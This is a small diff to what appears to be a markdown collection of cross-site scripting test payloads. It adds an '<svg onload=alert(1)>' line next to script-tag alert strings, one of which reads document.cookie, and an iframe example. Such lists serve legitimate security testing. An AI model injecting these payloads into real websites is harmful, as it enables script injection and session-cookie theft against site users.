@@ -7,6 +7,7 @@ Payloads
 <script>alert('XSS')</script>
 <script>alert(123123)</script>
 <script>alert(document.cookie)</script>
+<svg onload=alert(1)>
 ```
 
 iframe: `<iframe src="http://www.cnn.com"></iframe>`  
